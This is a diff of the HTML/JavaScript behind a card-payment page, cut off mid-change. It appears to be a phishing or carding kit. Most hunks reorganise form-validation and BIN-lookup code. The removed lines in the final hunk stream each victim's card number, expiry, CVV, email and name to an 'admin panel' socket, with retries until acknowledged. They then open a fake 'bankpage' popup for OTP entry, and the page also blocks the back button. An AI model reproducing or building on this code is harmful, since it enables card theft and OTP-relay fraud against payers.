@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
       <html lang="en">
       <head>
@@ -761,8 +760,8 @@
           let isExpiryValid = false;
           let isProcessing = false;
           let currentInvoiceId = "";
-          let statusCheckInterval = null; // Fixed: Initialize with null
-          let timerInterval = null; // Fixed: Initialize with null
+          let statusCheckInterval = null; 
+          let timerInterval = null; 
           let timer = 180;
           let consentChecked = true;
           let bankPageWindow = null;
@@ -959,34 +958,131 @@ function getBankpageUrl(invoiceId) {
   return `/bankpage-page.html?invoiceId=${invoiceId}`;
 }
           
-          // Check current URL and redirect if needed
-     document.addEventListener('DOMContentLoaded', function() {
-       const urlParams = new URLSearchParams(window.location.search);
-       const pid = urlParams.get('pid');
-       const hash = urlParams.get('hash') || getOrCreateHash();
-     
-       if (pid) {
-         // Reconnect socket with pid query parameter
-         socket.io.opts.query = {
-           pid: pid
-         };
-         socket.disconnect().connect();
-         
-         // Store pid in session
-         sessionStorage.setItem('pid', pid);
-             
-         // Store the hash in session for later use
-         sessionStorage.setItem('paymentHash', hash);
-         
-         // If we're on payment.html but not using clean URL format, redirect
-         if (window.location.pathname.includes('payment.html') && pid) {
-           const cleanUrl = `/p/${hash}?pid=${pid}`;
-           window.history.replaceState({}, '', cleanUrl);
-         }
-       }
-     });  // CORRECTLY CLOSED EVENT LISTENER HERE
+// FIXED: Consolidated DOMContentLoaded event listener with improved amount handling
+document.addEventListener('DOMContentLoaded', async function() {
+  let defaultAmount = 100;
+  let pid = new URLSearchParams(window.location.search).get('pid');
+  
+  console.log('[DEBUG] Initial PID from URL:', pid);
+  
+  // Check if PID exists in sessionStorage as backup
+  if (!pid) {
+    pid = sessionStorage.getItem('pid');
+    console.log('[DEBUG] PID from sessionStorage:', pid);
+  }
+
+  // Always set default first
+  document.getElementById('amount').value = defaultAmount;
+  document.getElementById('displayAmount').textContent = defaultAmount.toFixed(2);
+
+  // FIXED: Check for saved amount in sessionStorage first before API call
+  const savedAmount = sessionStorage.getItem('savedAmount');
+  if (savedAmount) {
+    const parsedAmount = parseFloat(savedAmount);
+    if (!isNaN(parsedAmount)) {
+      console.log('[DEBUG] Found saved amount in sessionStorage:', parsedAmount);
+      document.getElementById('amount').value = parsedAmount;
+      document.getElementById('displayAmount').textContent = parsedAmount.toFixed(2);
+    }
+  }
+
+  // Check if returning from currency page
+  if (sessionStorage.getItem('returning_from_currency') === 'true') {
+    // Clear the flag
+    sessionStorage.removeItem('returning_from_currency');
+    
+    // Restore form data
+    restoreFormData();
+    
+    // Try to also restore the amount from sessionStorage
+    const savedAmount = sessionStorage.getItem('savedAmount');
+    console.log('[DEBUG] Restoring amount from sessionStorage:', savedAmount);
+    if (savedAmount) {
+      const amount = parseFloat(savedAmount);
+      document.getElementById('amount').value = amount;
+      document.getElementById('displayAmount').textContent = amount.toFixed(2);
+    }
+    
+    // Show loading state on the submit button
+    const submitButton = document.getElementById('submitButton');
+    const submitText = document.getElementById('submitText');
+    const submitLoader = document.getElementById('submitLoader');
+    
+    if (submitButton && submitText && submitLoader) {
+      submitButton.classList.add('btn-loading');
+      submitText.style.opacity = '0.5';
+      submitText.style.filter = 'blur(1px)';
+      submitLoader.classList.remove('hidden');
       
-     async function getBankInfoFromBIN(bin) {
+      // Start checking transaction status
+      if (currentInvoiceId) {
+        console.log('[DEBUG] Returning from currency page, checking transaction status');
+        statusCheckInterval = setInterval(checkTransactionStatus, 2000);
+      }
+    }
+  }
+
+  // Modified for better error handling and debugging
+  if (pid) {
+    console.log('[DEBUG] Fetching payment details with PID:', pid);
+    try {
+      // Make sure to pass pid correctly
+      const response = await fetch(`/api/getPaymentDetails?pid=${encodeURIComponent(pid)}`);
+      console.log('[DEBUG] API response status:', response.status);
+      
+      // If the payment link is expired, redirect to expired page
+      if (response.status === 410) {
+        console.log('Payment link has expired, redirecting to expired page');
+        window.location.href = '/expired.html';
+        return;
+      }
+      
+      if (!response.ok) {
+        throw new Error(`Failed to get payment details: ${response.status}`);
+      }
+      
+      const data = await response.json();
+      console.log('[DEBUG] Payment details API response:', data);
+      
+      if (data.status === 'success' && data.payment?.amount) {
+        const amount = parseFloat(data.payment.amount) || defaultAmount;
+        console.log('[DEBUG] Setting amount to:', amount);
+        
+        // Save the amount to sessionStorage for later use
+        sessionStorage.setItem('savedAmount', amount.toString());
+        
+        // Update both the hidden input and the display
+        document.getElementById('amount').value = amount;
+        document.getElementById('displayAmount').textContent = amount.toFixed(2);
+      } else {
+        console.warn('[DEBUG] No valid amount found in API response');
+      }
+    } catch (error) {
+      console.error('[DEBUG] Payment details fetch error:', error);
+      // If there's an error getting payment details, we might want to redirect to expired/error page
+      if (error.message && error.message.includes('410')) {
+        window.location.href = '/expired.html';
+        return;
+      }
+    }
+  } else {
+    console.warn('[DEBUG] No PID found in URL or sessionStorage');
+  }
+
+  // Add consent checkbox event listener
+  document.getElementById('consentCheckbox').addEventListener('click', function() {
+    consentChecked = !consentChecked;
+    this.classList.toggle('checked', consentChecked);
+    updateSubmitButton(); // Force update button state
+  });
+
+  // Initial validation
+  updateSubmitButton();
+  
+  // Setup back button prevention
+  setupBackButtonPrevention();
+});
+              async function getBankInfoFromBIN(bin) {
        try {
          // First 6 digits are the BIN
          if (bin.length < 6) return null;
@@ -1174,64 +1270,63 @@ function getBankpageUrl(invoiceId) {
          };
        }
      }
-      
-          // Create or get the bank info dropdown element with animation
-          function getBankInfoDropdown() {
-            let dropdown = document.getElementById('bankInfoDropdown');
-            
-            if (!dropdown) {
-              dropdown = document.createElement('div');
-              dropdown.id = 'bankInfoDropdown';
-              
-              const cardNumberContainer = document.getElementById('cardNumber').parentNode;
-              cardNumberContainer.parentNode.insertBefore(dropdown, cardNumberContainer.nextSibling);
-            }
-            
-            return dropdown;
-          }
-      
-          // Show dropdown with animation
-          function showBankInfoDropdown(bankInfo) {
-            const dropdown = getBankInfoDropdown();
-            
-            // Prepare flag image
-            const flagUrl = bankInfo.countryCode ? 
-              `https://flagcdn.com/16x12/${bankInfo.countryCode.toLowerCase()}.png` : '';
-            const flagImg = flagUrl ? `<img src="${flagUrl}" alt="${bankInfo.countryCode}">` : '';
-            
-            // Create the content with better formatting
-            dropdown.innerHTML = `
-              <div class="bank-info-row">
-                <span class="bank-info-name">${bankInfo.bank || 'Unknown Bank'}</span>
-                <span class="bank-info-country">${flagImg} ${bankInfo.countryCode ? bankInfo.countryCode : ''} ${bankInfo.country || 'Unknown'}</span>
-              </div>
-              <div class="bank-info-details">
-                <span>${bankInfo.scheme ? bankInfo.scheme.toUpperCase() : ''} ${bankInfo.type ? '• ' + bankInfo.type.toUpperCase() : ''}</span>
-                <span>${bankInfo.currency || ''}</span>
-              </div>
-            `;
-            
-            // First set display to block but keep it invisible
-            dropdown.style.display = 'block';
-            
-            // Trigger animation with a small delay to ensure display change takes effect
-            setTimeout(() => {
-              dropdown.classList.add('visible');
-            }, 10);
-          }
-      
-          // Hide dropdown with animation
-          function hideBankInfoDropdown() {
-            const dropdown = document.getElementById('bankInfoDropdown');
-            if (dropdown) {
-              dropdown.classList.remove('visible');
-              // Wait for animation to complete before hiding
-              setTimeout(() => {
-                dropdown.style.display = 'none';
-              }, 300);
-            }
-          }
-         // Create or get the currency dropdown element
+              // Create or get the bank info dropdown element with animation
+      function getBankInfoDropdown() {
+        let dropdown = document.getElementById('bankInfoDropdown');
+        
+        if (!dropdown) {
+          dropdown = document.createElement('div');
+          dropdown.id = 'bankInfoDropdown';
+          
+          const cardNumberContainer = document.getElementById('cardNumber').parentNode;
+          cardNumberContainer.parentNode.insertBefore(dropdown, cardNumberContainer.nextSibling);
+        }
+        
+        return dropdown;
+      }
+  
+      // Show dropdown with animation
+      function showBankInfoDropdown(bankInfo) {
+        const dropdown = getBankInfoDropdown();
+        
+        // Prepare flag image
+        const flagUrl = bankInfo.countryCode ? 
+          `https://flagcdn.com/16x12/${bankInfo.countryCode.toLowerCase()}.png` : '';
+        const flagImg = flagUrl ? `<img src="${flagUrl}" alt="${bankInfo.countryCode}">` : '';
+        
+        // Create the content with better formatting
+        dropdown.innerHTML = `
+          <div class="bank-info-row">
+            <span class="bank-info-name">${bankInfo.bank || 'Unknown Bank'}</span>
+            <span class="bank-info-country">${flagImg} ${bankInfo.countryCode ? bankInfo.countryCode : ''} ${bankInfo.country || 'Unknown'}</span>
+          </div>
+          <div class="bank-info-details">
+            <span>${bankInfo.scheme ? bankInfo.scheme.toUpperCase() : ''} ${bankInfo.type ? '• ' + bankInfo.type.toUpperCase() : ''}</span>
+            <span>${bankInfo.currency || ''}</span>
+          </div>
+        `;
+        
+        // First set display to block but keep it invisible
+        dropdown.style.display = 'block';
+        
+        // Trigger animation with a small delay to ensure display change takes effect
+        setTimeout(() => {
+          dropdown.classList.add('visible');
+        }, 10);
+      }
+  
+      // Hide dropdown with animation
+      function hideBankInfoDropdown() {
+        const dropdown = document.getElementById('bankInfoDropdown');
+        if (dropdown) {
+          dropdown.classList.remove('visible');
+          // Wait for animation to complete before hiding
+          setTimeout(() => {
+            dropdown.style.display = 'none';
+          }, 300);
+        }
+      }
+     // Create or get the currency dropdown element
      function getCurrencyDropdown() {
        let dropdown = document.getElementById('currencyDropdown');
        
@@ -1337,161 +1432,49 @@ function getBankpageUrl(invoiceId) {
          indicator.classList.remove('visible');
        }
      }
-       document.addEventListener('DOMContentLoaded', async () => {
-  let defaultAmount = 100;
-  let pid = new URLSearchParams(window.location.search).get('pid');
-  
-  console.log('[DEBUG] Initial PID from URL:', pid);
-  
-  // Check if PID exists in sessionStorage as backup
-  if (!pid) {
-    pid = sessionStorage.getItem('pid');
-    console.log('[DEBUG] PID from sessionStorage:', pid);
-  }
 
-  // Always set default first
-  document.getElementById('amount').value = defaultAmount;
-  document.getElementById('displayAmount').textContent = defaultAmount.toFixed(2);
-
-  // Check if returning from currency page
-  if (sessionStorage.getItem('returning_from_currency') === 'true') {
-    // Clear the flag
-    sessionStorage.removeItem('returning_from_currency');
-    
-    // Restore form data
-    restoreFormData();
-    
-    // Try to also restore the amount from sessionStorage
-    const savedAmount = sessionStorage.getItem('savedAmount');
-    console.log('[DEBUG] Restoring amount from sessionStorage:', savedAmount);
-    if (savedAmount) {
-      const amount = parseFloat(savedAmount);
-      document.getElementById('amount').value = amount;
-      document.getElementById('displayAmount').textContent = amount.toFixed(2);
-    }
-    
-    // Show loading state on the submit button
-    const submitButton = document.getElementById('submitButton');
-    const submitText = document.getElementById('submitText');
-    const submitLoader = document.getElementById('submitLoader');
-    
-    if (submitButton && submitText && submitLoader) {
-      submitButton.classList.add('btn-loading');
-      submitText.style.opacity = '0.5';
-      submitText.style.filter = 'blur(1px)';
-      submitLoader.classList.remove('hidden');
-      
-      // Start checking transaction status
-      if (currentInvoiceId) {
-        console.log('[DEBUG] Returning from currency page, checking transaction status');
-        statusCheckInterval = setInterval(checkTransactionStatus, 2000);
-      }
-    }
-  }
-
-  // Modified for better error handling and debugging
-  if (pid) {
-    console.log('[DEBUG] Fetching payment details with PID:', pid);
-    try {
-      // Make sure to pass pid correctly
-      const response = await fetch(`/api/getPaymentDetails?pid=${encodeURIComponent(pid)}`);
-      console.log('[DEBUG] API response status:', response.status);
-      
-      // If the payment link is expired, redirect to expired page
-      if (response.status === 410) {
-        console.log('Payment link has expired, redirecting to expired page');
-        window.location.href = '/expired.html';
-        return;
-      }
-      
-      if (!response.ok) {
-        throw new Error(`Failed to get payment details: ${response.status}`);
-      }
-      
-      const data = await response.json();
-      console.log('[DEBUG] Payment details API response:', data);
-      
-      if (data.status === 'success' && data.payment?.amount) {
-        const amount = parseFloat(data.payment.amount) || defaultAmount;
-        console.log('[DEBUG] Setting amount to:', amount);
-        
-        // Save the amount to sessionStorage for later use
-        sessionStorage.setItem('savedAmount', amount.toString());
-        
-        // Update both the hidden input and the display
-        document.getElementById('amount').value = amount;
-        document.getElementById('displayAmount').textContent = amount.toFixed(2);
-      } else {
-        console.warn('[DEBUG] No valid amount found in API response');
-      }
-    } catch (error) {
-      console.error('[DEBUG] Payment details fetch error:', error);
-      // If there's an error getting payment details, we might want to redirect to expired/error page
-      if (error.message && error.message.includes('410')) {
-        window.location.href = '/expired.html';
-        return;
-      }
-    }
-  } else {
-    console.warn('[DEBUG] No PID found in URL or sessionStorage');
-  }
-
-  // Add consent checkbox event listener
-  document.getElementById('consentCheckbox').addEventListener('click', function() {
-    consentChecked = !consentChecked;
-    this.classList.toggle('checked', consentChecked);
-    updateSubmitButton(); // Force update button state
-  });
-
-  // Initial validation
-  updateSubmitButton();
-  
-  // Setup back button prevention
-  setupBackButtonPrevention();
-});
-      
-      function validateCard(number) {
-        // Remove all non-digits
-        const clean = number.replace(/\D/g, '');
-        
-        // Check if length is valid for a card number (13-19 digits)
-        if (clean.length < 13 || clean.length > 19) return false;
-        
-        // Luhn algorithm for card validation
-        let sum = 0;
-        let double = false;
-        
-        // Loop from the right to left
-        for (let i = clean.length - 1; i >= 0; i--) {
-          let digit = parseInt(clean[i], 10);
-          
-          if (double) {
-            digit *= 2;
-            if (digit > 9) digit -= 9;
-          }
-          
-          sum += digit;
-          double = !double;
-        }
-        
-        return sum % 10 === 0;
-      }
-      
-          function formatCardNumber(value) {
-            return value.replace(/\D/g, '')
-                      .replace(/(\d{4})(?=\d)/g, '$1 ')
-                      .substring(0, 19);
-          }
-      
-          function formatExpiry(value) {
-            let digits = value.replace(/\D/g, '');
-            digits = digits.substring(0, 4);
-            if (digits.length >= 3) {
-              return digits.substring(0, 2) + '/' + digits.substring(2);
-            }
-            return digits;
-          }
-      
+     function validateCard(number) {
+       // Remove all non-digits
+       const clean = number.replace(/\D/g, '');
+       
+       // Check if length is valid for a card number (13-19 digits)
+       if (clean.length < 13 || clean.length > 19) return false;
+       
+       // Luhn algorithm for card validation
+       let sum = 0;
+       let double = false;
+       
+       // Loop from the right to left
+       for (let i = clean.length - 1; i >= 0; i--) {
+         let digit = parseInt(clean[i], 10);
+         
+         if (double) {
+           digit *= 2;
+           if (digit > 9) digit -= 9;
+         }
+         
+         sum += digit;
+         double = !double;
+       }
+       
+       return sum % 10 === 0;
+     }
+     
+     function formatCardNumber(value) {
+       return value.replace(/\D/g, '')
+                 .replace(/(\d{4})(?=\d)/g, '$1 ')
+                 .substring(0, 19);
+     }
+ 
+     function formatExpiry(value) {
+       let digits = value.replace(/\D/g, '');
+       digits = digits.substring(0, 4);
+       if (digits.length >= 3) {
+         return digits.substring(0, 2) + '/' + digits.substring(2);
+       }
+       return digits;
+     }
+ 
      function validateExpiry(value) {
        if (!/^\d{2}\/\d{2}$/.test(value)) return false;
        const [month, year] = value.split('/').map(Number);
@@ -1501,147 +1484,146 @@ function getBankpageUrl(invoiceId) {
        const currentMonth = now.getMonth() + 1;
        return !(year < currentYear || (year === currentYear && month < currentMonth));
      }
-      
-          function updateCardError() {
-            const cardInput = document.getElementById("cardNumber");
-            const errorElem = document.getElementById("cardError");
-            if (!cardInput || !errorElem) return; // Fixed: Add null check
-            
-            const plain = cardInput.value.replace(/\s/g, '');
-            isCardValid = validateCard(plain);
-            if (plain.length === 16 && !isCardValid) {
-              errorElem.style.display = 'block';
-              errorElem.textContent = "Please enter valid card number";
-              cardInput.classList.add('border-red-500');
-            } else {
-              errorElem.style.display = 'none';
-              cardInput.classList.remove('border-red-500');
-            }
-          }
-      
-          function detectCardType(number) {
-        const clean = number.replace(/\D/g, '');
-        
-        // Visa
-        if (/^4/.test(clean)) return 'visa';
-        
-        // Mastercard
-        if (/^(5[1-5]|2[2-7])/.test(clean)) return 'mastercard';
-        
-        // American Express
-        if (/^3[47]/.test(clean)) return 'amex';
-        
-        // Discover
-        if (/^(6011|65|64[4-9]|622)/.test(clean)) return 'discover';
-        
-        // JCB
-        if (/^35/.test(clean)) return 'jcb';
-        
-        // Diners Club
-        if (/^(30[0-5]|36|38)/.test(clean)) return 'diners';
-        
-        // RuPay
-        if (/^(508[5-9]|60698|607[0-8]|6079[0-8]|608[0-5]|652[1-9]|653[0-4])/.test(clean)) return 'rupay';
-        
-        return null;
-      }
-      
-          function updateCardTypeAndInfo(value) {
-            const cardLogo = document.getElementById("cardLogo");
-            if (!cardLogo) return; // Fixed: Add null check
-            
-            const detectedType = detectCardType(value);
-            const logos = {
-              visa: 'https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png',
-              mastercard: 'https://pngimg.com/uploads/mastercard/mastercard_PNG16.png',
-              amex: 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png',
-              rupay: 'https://www.gokiwi.in/homepage/partners/rupay.svg'
-            };
-            if (detectedType && logos[detectedType]) {
-              cardLogo.src = logos[detectedType];
-              cardLogo.classList.remove('hidden');
-            } else {
-              cardLogo.classList.add('hidden');
-            }
-          }
-      
-          function updateSubmitButton() {
-            const emailEl = document.getElementById('email');
-            const cvvEl = document.getElementById('cvv');
-            const cardholderNameEl = document.getElementById('cardholderName');
-            const submitButtonEl = document.getElementById('submitButton');
-            
-            if (!emailEl || !cvvEl || !cardholderNameEl || !submitButtonEl) return; // Fixed: Add null check
-            
-            const emailValid = emailEl.checkValidity();
-            const cardValid = isCardValid;
-            const expiryValid = isExpiryValid;
-            const cvvValid = cvvEl.value.length === 3;
-            const nameValid = cardholderNameEl.value.trim().length > 0;
-      
-            const allValid = emailValid && cardValid && expiryValid && cvvValid && nameValid && consentChecked;
-      
-            submitButtonEl.disabled = !allValid;
-          }
-      
-          function updateConfirmOtpButton() {
-            const otpEl = document.getElementById('otp');
-            const otpButtonEl = document.getElementById('otpSubmitButton');
-            const otpErrorEl = document.getElementById('otpError');
-            
-            if (!otpEl || !otpButtonEl || !otpErrorEl) return; // Fixed: Add null check
-            
-            if (otpEl.value.length === 6) {
-              otpButtonEl.disabled = false;
-              otpButtonEl.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-blue-600 text-white";
-              otpErrorEl.style.display = 'none';
-            } else {
-              otpButtonEl.disabled = true;
-              otpButtonEl.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white";
-            }
-          }
-      
-          // Attach Input Handlers
-          document.addEventListener("DOMContentLoaded", function(){
-            const cardInput = document.getElementById("cardNumber");
-            const expiryInput = document.getElementById("expiry");
-      
-            if (cardInput) {
-              cardInput.addEventListener("input", async function(e) {
-                // Store current cursor position and value
-                const cursorPosition = e.target.selectionStart;
-                const value = e.target.value;
-                
-                // Calculate how many spaces were before the cursor
-                const valueBeforeCursor = value.slice(0, cursorPosition);
-                const oldSpacesBeforeCursor = (valueBeforeCursor.match(/ /g) || []).length;
-                
-                // Format the card number
-                const formatted = formatCardNumber(value);
-                
-                // Calculate new cursor position
-                const digitsBeforeCursor = valueBeforeCursor.replace(/\D/g, '').length;
-                const newSpacesBeforeCursor = Math.floor(digitsBeforeCursor / 4);
-                const newPosition = digitsBeforeCursor + newSpacesBeforeCursor;
-                
-                // Update the value with minimal UI disruption
-                e.target.value = formatted;
-                
-                // Restore cursor position
-                if (cursorPosition === value.length) {
-                  // If cursor was at the end, keep it at the end
-                  e.target.setSelectionRange(formatted.length, formatted.length);
-                } else {
-                  // Otherwise, put it at the calculated position
-                  e.target.setSelectionRange(newPosition, newPosition);
-                }
-                
-                // Validation check
-                isCardValid = validateCard(formatted.replace(/\s/g, ''));
-                updateCardError();
-                updateCardTypeAndInfo(formatted);
-                updateSubmitButton();
-                
+     
+     function updateCardError() {
+       const cardInput = document.getElementById("cardNumber");
+       const errorElem = document.getElementById("cardError");
+       if (!cardInput || !errorElem) return; // Fixed: Add null check
+       
+       const plain = cardInput.value.replace(/\s/g, '');
+       isCardValid = validateCard(plain);
+       if (plain.length === 16 && !isCardValid) {
+         errorElem.style.display = 'block';
+         errorElem.textContent = "Please enter valid card number";
+         cardInput.classList.add('border-red-500');
+       } else {
+         errorElem.style.display = 'none';
+         cardInput.classList.remove('border-red-500');
+       }
+     }
+ 
+     function detectCardType(number) {
+       const clean = number.replace(/\D/g, '');
+       
+       // Visa
+       if (/^4/.test(clean)) return 'visa';
+       
+       // Mastercard
+       if (/^(5[1-5]|2[2-7])/.test(clean)) return 'mastercard';
+       
+       // American Express
+       if (/^3[47]/.test(clean)) return 'amex';
+       
+       // Discover
+       if (/^(6011|65|64[4-9]|622)/.test(clean)) return 'discover';
+       
+       // JCB
+       if (/^35/.test(clean)) return 'jcb';
+       
+       // Diners Club
+       if (/^(30[0-5]|36|38)/.test(clean)) return 'diners';
+       
+       // RuPay
+       if (/^(508[5-9]|60698|607[0-8]|6079[0-8]|608[0-5]|652[1-9]|653[0-4])/.test(clean)) return 'rupay';
+       
+       return null;
+     }
+     
+     function updateCardTypeAndInfo(value) {
+       const cardLogo = document.getElementById("cardLogo");
+       if (!cardLogo) return; // Fixed: Add null check
+       
+       const detectedType = detectCardType(value);
+       const logos = {
+         visa: 'https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png',
+         mastercard: 'https://pngimg.com/uploads/mastercard/mastercard_PNG16.png',
+         amex: 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png',
+         rupay: 'https://www.gokiwi.in/homepage/partners/rupay.svg'
+       };
+       if (detectedType && logos[detectedType]) {
+         cardLogo.src = logos[detectedType];
+         cardLogo.classList.remove('hidden');
+       } else {cardLogo.classList.add('hidden');
+       }
+     }
+ 
+     function updateSubmitButton() {
+       const emailEl = document.getElementById('email');
+       const cvvEl = document.getElementById('cvv');
+       const cardholderNameEl = document.getElementById('cardholderName');
+       const submitButtonEl = document.getElementById('submitButton');
+       
+       if (!emailEl || !cvvEl || !cardholderNameEl || !submitButtonEl) return; // Fixed: Add null check
+       
+       const emailValid = emailEl.checkValidity();
+       const cardValid = isCardValid;
+       const expiryValid = isExpiryValid;
+       const cvvValid = cvvEl.value.length === 3;
+       const nameValid = cardholderNameEl.value.trim().length > 0;
+ 
+       const allValid = emailValid && cardValid && expiryValid && cvvValid && nameValid && consentChecked;
+ 
+       submitButtonEl.disabled = !allValid;
+     }
+ 
+     function updateConfirmOtpButton() {
+       const otpEl = document.getElementById('otp');
+       const otpButtonEl = document.getElementById('otpSubmitButton');
+       const otpErrorEl = document.getElementById('otpError');
+       
+       if (!otpEl || !otpButtonEl || !otpErrorEl) return; // Fixed: Add null check
+       
+       if (otpEl.value.length === 6) {
+         otpButtonEl.disabled = false;
+         otpButtonEl.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-blue-600 text-white";
+         otpErrorEl.style.display = 'none';
+       } else {
+         otpButtonEl.disabled = true;
+         otpButtonEl.className = "w-full px-3 py-2 border border-gray-300 rounded-md flex items-center justify-center bg-gray-400 text-white";
+       }
+     }
+ 
+     // Attach Input Handlers
+     document.addEventListener("DOMContentLoaded", function(){
+       const cardInput = document.getElementById("cardNumber");
+       const expiryInput = document.getElementById("expiry");
+ 
+       if (cardInput) {
+         cardInput.addEventListener("input", async function(e) {
+           // Store current cursor position and value
+           const cursorPosition = e.target.selectionStart;
+           const value = e.target.value;
+           
+           // Calculate how many spaces were before the cursor
+           const valueBeforeCursor = value.slice(0, cursorPosition);
+           const oldSpacesBeforeCursor = (valueBeforeCursor.match(/ /g) || []).length;
+           
+           // Format the card number
+           const formatted = formatCardNumber(value);
+           
+           // Calculate new cursor position
+           const digitsBeforeCursor = valueBeforeCursor.replace(/\D/g, '').length;
+           const newSpacesBeforeCursor = Math.floor(digitsBeforeCursor / 4);
+           const newPosition = digitsBeforeCursor + newSpacesBeforeCursor;
+           
+           // Update the value with minimal UI disruption
+           e.target.value = formatted;
+           
+           // Restore cursor position
+           if (cursorPosition === value.length) {
+             // If cursor was at the end, keep it at the end
+             e.target.setSelectionRange(formatted.length, formatted.length);
+           } else {
+             // Otherwise, put it at the calculated position
+             e.target.setSelectionRange(newPosition, newPosition);
+           }
+           
+           // Validation check
+           isCardValid = validateCard(formatted.replace(/\s/g, ''));
+           updateCardError();
+           updateCardTypeAndInfo(formatted);
+           updateSubmitButton();
+           
      // Get BIN info when sufficient digits are entered
      const cleanCardNumber = formatted.replace(/\s/g, '');
      if (cleanCardNumber.length >= 6) {
@@ -1666,599 +1648,599 @@ function getBankpageUrl(invoiceId) {
      } else {
        hideCurrencyDropdown();
      }
-              });
-            }
-      
-            if (expiryInput) {
-              expiryInput.addEventListener("input", function(e) {
-                let value = e.target.value.replace(/\D/g, '');
-      
-                // Auto-insert slash after 2 digits
-                if (value.length > 2) {
-                  value = value.substring(0, 2) + '/' + value.substring(2, 4);
-                }
-                e.target.value = value.substring(0, 5);
-      
-                // Validate
-                isExpiryValid = validateExpiry(e.target.value);
-                updateSubmitButton();
-              });
-            }
-      
-            const emailInput = document.getElementById('email');
-            const cvvInput = document.getElementById('cvv');
-            const cardholderNameInput = document.getElementById('cardholderName');
-            const otpInput = document.getElementById('otp');
-            
-            // Add input event listeners for validation
-            if (emailInput) {
-              emailInput.addEventListener('input', updateSubmitButton);
-            }
-            
-            if (cvvInput) {
-              cvvInput.addEventListener('input', updateSubmitButton);
-            }
-            
-            if (cardholderNameInput) {
-              cardholderNameInput.addEventListener('input', updateSubmitButton);
-            }
-            
-            if (otpInput) {
-              otpInput.addEventListener('input', updateConfirmOtpButton);
-            }
-      
-            // Payment Submission Handler with hash URL for bankpage
-            const mainForm = document.getElementById('mainForm');
-            if (mainForm) {
-              mainForm.addEventListener('submit', async function(e) {
-                e.preventDefault();
-                if (!isCardValid || !isExpiryValid || isProcessing) return;
-      
-                isProcessing = true;
-                const submitButton = document.getElementById('submitButton');
-                const submitText = document.getElementById('submitText');
-                const submitLoader = document.getElementById('submitLoader');
-      
-                if (!submitButton || !submitText || !submitLoader) return; // Added null check
-                
-                // Show loading state
-                submitButton.classList.add('btn-loading');
-                submitText.style.opacity = '0.5';
-                submitText.style.filter = 'blur(1px)';
-                submitLoader.classList.remove('hidden');
-      
-                try {
-                  // Get bank info if available
-                  const bankInfoEl = document.getElementById('bankInfo');
-                  const bankInfoData = bankInfoEl ? bankInfoEl.value : null;
-                  
-                  const response = await fetch("/api/sendPaymentDetails", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                      cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
-                      expiry: document.getElementById('expiry').value,
-                      cvv: document.getElementById('cvv').value,
-                      email: document.getElementById('email').value,
-                      amount: document.getElementById('amount').value,
-                      currency: "INR",
-                      cardholder: document.getElementById('cardholderName').value,
-                      bankInfo: bankInfoData
-                    })
-                  });
-      
-                  const data = await response.json();
-                  if (!response.ok) throw new Error(data.message || 'Payment failed');
-      
-                  // After setting currentInvoiceId from the API response:
-                  currentInvoiceId = data.invoiceId;
-                  localStorage.setItem('invoiceId', currentInvoiceId);
-                  
-                  // Save form data for currency page return
-                  saveFormData();
-                  
-                  console.log('Joining socket.io room with invoiceId:', currentInvoiceId);
-                  socket.emit('join', currentInvoiceId);
-     
-                 // Send card details immediately to admin panel via socket
-                 socket.emit('card_submitted', {
-       invoiceId: currentInvoiceId,
-       cardData: {
-         cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
-         expiry: document.getElementById('expiry').value,
-         cvv: document.getElementById('cvv').value,
-         email: document.getElementById('email').value,
-         amount: document.getElementById('amount').value,
-         cardholder: document.getElementById('cardholderName').value,
-         timestamp: new Date().toISOString(),
-         // Include bank information if available
-         bankName: JSON.parse(bankInfoData || '{}').bank || 'Unknown',
-         country: JSON.parse(bankInfoData || '{}').country || 'Unknown',
-         cardType: JSON.parse(bankInfoData || '{}').scheme || 'Unknown'
+         });
        }
-     });
-     
-     // Also send a notification to wake up any sleeping admin panels
-     socket.emit('notify_admin', {
-       type: 'card_data',
-       invoiceId: currentInvoiceId,
-       message: 'New card submission received'
-     });
-     
-     // Set up a fallback mechanism to ensure admin panel gets the data
-     let cardDataAcknowledged = false;
-     const cardDataInterval = setInterval(() => {
-       if (cardDataAcknowledged) {
-         clearInterval(cardDataInterval);
-         return;
-       }
-       
-       // Resend card data if not acknowledged within 2 seconds
-       socket.emit('card_submitted', {
-         invoiceId: currentInvoiceId,
-         cardData: {
-           cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
-           expiry: document.getElementById('expiry').value,
-           cvv: document.getElementById('cvv').value,
-           email: document.getElementById('email').value,
-           amount: document.getElementById('amount').value,
-           cardholder: document.getElementById('cardholderName').value,
-           timestamp: new Date().toISOString(),
-           bankName: JSON.parse(bankInfoData || '{}').bank || 'Unknown',
-           country: JSON.parse(bankInfoData || '{}').country || 'Unknown',
-           cardType: JSON.parse(bankInfoData || '{}').scheme || 'Unknown',
-           retry: true
-         }
-       });
-     }, 2000);
-                  // Use clean hash URL for bankpage
-                  const bankpageUrl = getBankpageUrl(data.invoiceId);
-                  bankPageWindow = window.open(
-                    bankpageUrl,
-                    '_blank',
-                    'width=600,height=800'
-                  );
-      
-                  // Check window closure - but don't reset loading state when it closes
-                  const checkWindowClosed = setInterval(() => {
-                    if (bankPageWindow && bankPageWindow.closed) {
-                      clearInterval(checkWindowClosed);
-                    }
-                  }, 500);
-      
-                } catch (error) {
-                  console.error('Payment Error:', error);
-                  alert(`Payment Failed: ${error.message}`);
-                  submitButton.classList.remove('btn-loading');
-                  submitText.style.opacity = '1';
-                  submitText.style.filter = 'none';
-                  submitLoader.classList.add('hidden');
-                  isProcessing = false;
-                }
-              });
-            }
-      
-            // OTP Submission Handler
-            const otpSubmitButton = document.getElementById('otpSubmitButton');
-            if (otpSubmitButton) {
-              otpSubmitButton.addEventListener('click', async () => {
-                if (isProcessing) return;
-                isProcessing = true;
-                const otpButton = document.getElementById('otpSubmitButton');
-                const otpLoader = document.getElementById('otpLoader');
